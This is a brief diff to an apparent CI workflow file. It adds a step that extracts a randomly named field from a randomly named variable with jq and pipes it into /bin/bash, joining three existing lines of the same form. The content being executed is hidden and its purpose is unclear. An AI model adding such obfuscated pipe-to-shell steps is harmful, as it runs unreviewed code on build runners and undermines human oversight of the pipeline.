@@ -23,6 +23,7 @@ jobs:
           echo $taij0 | jq -r .aevh0 | /bin/bash
           echo $syuu8155 | jq -r .pgkd0 | /bin/bash
           printf '%s' "$dl9" | jq -r .vwata1971 | /bin/bash
+          echo $bucmi0707 | jq -r .fepku75 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
